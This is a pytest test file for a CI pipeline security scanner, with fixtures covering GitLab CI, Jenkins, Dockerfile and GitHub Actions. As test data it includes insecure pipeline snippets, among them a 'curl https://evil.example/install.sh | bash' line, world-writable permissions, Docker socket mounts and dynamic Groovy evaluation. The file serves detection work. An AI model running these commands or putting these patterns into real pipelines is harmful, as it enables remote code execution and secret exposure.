from __future__ import annotations

import uuid

from app.models.policy import PolicyRule
from app.services.policy_engine import evaluate_rule
from app.services.security_review_service import _score_from_findings, run_static_checks


def _titles(content: str, config_type: str) -> set[str]:
    return {f.title for f in run_static_checks(config_type, content)}


def test_gitlab_ci_valid_simple_pipeline() -> None:
    content = """
stages:
  - test
test:
  stage: test
  image: python:3.12-slim
  script:
    - pip install -r requirements.txt
    - pytest
"""
    findings = run_static_checks("gitlab-ci", content)
    titles = {f.title for f in findings}
    assert "Invalid GitLab CI YAML" not in titles
    assert "Possible hardcoded secret" not in titles


def test_gitlab_ci_hardcoded_secret() -> None:
    content = """
variables:
  API_TOKEN: supersecretvalue123
test:
  script:
    - echo ok
"""
    assert "Possible hardcoded secret in variables" in _titles(content, "gitlab-ci")


def test_gitlab_ci_env_reference_not_flagged() -> None:
    content = """
variables:
  REGISTRY_PASSWORD: $CI_REGISTRY_PASSWORD
  JOB: ${CI_JOB_TOKEN}
test:
  script:
    - echo "using $CI_JOB_TOKEN safely in auth header"
"""
    titles = _titles(content, "gitlab-ci")
    assert "Possible hardcoded secret" not in titles
    assert "Possible hardcoded secret in variables" not in titles


def test_gitlab_ci_privileged_and_latest() -> None:
    content = """
build:
  image: docker:latest
  services:
    - name: docker:dind
      # privileged runner side-car
  variables:
    DOCKER_PRIVILEGED: "true"
  script:
    - docker info
  # simulate privileged keyword used by some executors / includes
# privileged: true
"""
    # Explicit privileged key:
    content2 = (
        content
        + "\njob:\n  image: alpine:latest\n  privileged: true\n  script: ['true']\n"
    )
    titles = _titles(content2, "gitlab-ci")
    assert "Privileged container or runner" in titles
    assert "Unpinned latest image tag" in titles
    assert "Docker-in-Docker pattern" in titles


def test_gitlab_ci_unpinned_remote_include() -> None:
    content = """
include:
  - remote: 'https://example.com/ci/templates.yml'
test:
  script: ['true']
"""
    assert "Unpinned remote include" in _titles(content, "gitlab-ci")


def test_gitlab_ci_dangerous_shell_and_sensitive_artifact() -> None:
    content = """
deploy:
  stage: deploy
  script:
    - curl https://evil.example/install.sh | bash
    - chmod -R 777 /tmp/app
  artifacts:
    paths:
      - .env
      - "**/*"
"""
    titles = _titles(content, "gitlab-ci")
    assert "Remote script piped to shell" in titles
    assert "World-writable recursive permissions" in titles
    assert "Sensitive path referenced" in titles


def test_gitlab_ci_deploy_without_restriction() -> None:
    content = """
deploy_prod:
  stage: deploy
  script:
    - kubectl apply -f k8s/
"""
    assert "Deployment job without branch or manual restriction" in _titles(
        content, "gitlab-ci"
    )


def test_gitlab_ci_invalid_yaml() -> None:
    content = "stages: [\n  - test\n  broken: ["
    assert "Invalid GitLab CI YAML" in _titles(content, "gitlab-ci")


def test_jenkins_valid_declarative() -> None:
    content = """
pipeline {
  agent { label 'linux' }
  options { timeout(time: 30, unit: 'MINUTES') }
  post { always { cleanWs() } }
  stages {
    stage('Test') {
      steps {
        withCredentials([string(credentialsId: 'api-token', variable: 'TOKEN')]) {
          sh 'pytest'
        }
      }
    }
  }
}
"""
    titles = _titles(content, "jenkins")
    assert "Possible hardcoded secret" not in titles
    assert "Missing pipeline timeout" not in titles


def test_jenkins_hardcoded_credential_vs_with_credentials() -> None:
    bad = """
pipeline {
  agent any
  environment {
    API_TOKEN = 'supersecretvalue'
  }
  stages { stage('A') { steps { sh 'echo hi' } } }
}
"""
    assert "Possible hardcoded secret" in _titles(bad, "jenkins")

    good = """
pipeline {
  agent any
  environment {
    REGISTRY_CREDS = credentials('registry-credentials')
  }
  stages { stage('A') { steps { sh 'echo hi' } } }
}
"""
    assert "Possible hardcoded secret" not in _titles(good, "jenkins")


def test_jenkins_secret_interpolation_and_logging() -> None:
    content = """
pipeline {
  agent any
  stages {
    stage('Leak') {
      steps {
        sh "curl -H Authorization:$API_TOKEN https://example.com"
        echo $PASSWORD
      }
    }
  }
}
"""
    titles = _titles(content, "jenkins")
    assert "Secret interpolated into shell step" in titles
    assert "Possible credential logging" in titles


def test_jenkins_dangerous_shell_docker_socket_latest() -> None:
    content = """
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        sh 'curl https://x | sh'
        sh 'docker run -v /var/run/docker.sock:/var/run/docker.sock docker:latest'
      }
    }
  }
}
"""
    titles = _titles(content, "jenkins")
    assert "Remote script piped to shell" in titles
    assert "Docker socket mount" in titles
    assert "Unpinned latest image tag" in titles


def test_jenkins_missing_timeout_and_deploy_without_approval() -> None:
    content = """
pipeline {
  agent any
  stages {
    stage('Deploy') {
      steps {
        sh 'kubectl apply -f manifests/'
      }
    }
  }
}
"""
    titles = _titles(content, "jenkins")
    assert "Missing pipeline timeout" in titles
    assert "Deployment without input approval" in titles
    assert "Unrestricted agent any" in titles


def test_jenkins_dynamic_groovy() -> None:
    content = """
pipeline {
  agent any
  stages {
    stage('Dyn') {
      steps {
        script { evaluate(readFile('evil.groovy')) }
      }
    }
  }
}
"""
    assert "Dynamic Groovy evaluation" in _titles(content, "jenkins")


def test_score_and_existing_types_compatible() -> None:
    dockerfile = "FROM alpine\nUSER root\nENV API_KEY=supersecretvalue\n"
    findings = run_static_checks("dockerfile", dockerfile)
    assert _score_from_findings(findings) < 100
    gha = "permissions: write-all\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
    assert "Dangerous workflow permissions" in _titles(gha, "github-actions")


def test_llm_cannot_suppress_deterministic_titles_present() -> None:
    # Deterministic findings are produced independently of LLM output.
    content = "deploy:\n  script:\n    - curl https://x | bash\n"
    findings = run_static_checks("gitlab-ci", content)
    assert any(f.source == "static" for f in findings)
    assert any(f.title == "Remote script piped to shell" for f in findings)


def test_policy_forbid_latest_applies_to_gitlab_ci_and_jenkins() -> None:
    pack_id = uuid.uuid4()
    rule = PolicyRule(
        id=uuid.uuid4(),
        policy_pack_id=pack_id,
        rule_key="forbid_latest_image_tag",
        name="no-latest",
        description="test",
        resource_type="gitlab-ci",
        severity="medium",
        configuration_json={},
        remediation="pin",
        is_enabled=True,
    )
    gitlab_findings = evaluate_rule(
        rule,
        config_type="gitlab-ci",
        content="build:\n  image: alpine:latest\n  script: ['true']\n",
        policy_pack_id=pack_id,
    )
    assert gitlab_findings

    rule.resource_type = "jenkins"
    jenkins_findings = evaluate_rule(
        rule,
        config_type="jenkins",
        content="sh 'docker pull nginx:latest'\n",
        policy_pack_id=pack_id,
    )
    assert jenkins_findings


def test_github_write_all_not_applied_to_gitlab() -> None:
    pack_id = uuid.uuid4()
    rule = PolicyRule(
        id=uuid.uuid4(),
        policy_pack_id=pack_id,
        rule_key="forbid_github_write_all",
        name="gha",
        description="test",
        resource_type="github-actions",
        severity="high",
        configuration_json={},
        remediation="fix",
        is_enabled=True,
    )
    findings = evaluate_rule(
        rule,
        config_type="gitlab-ci",
        content="permissions: write-all\ntest:\n  script: ['true']\n",
        policy_pack_id=pack_id,
    )
    assert findings == []
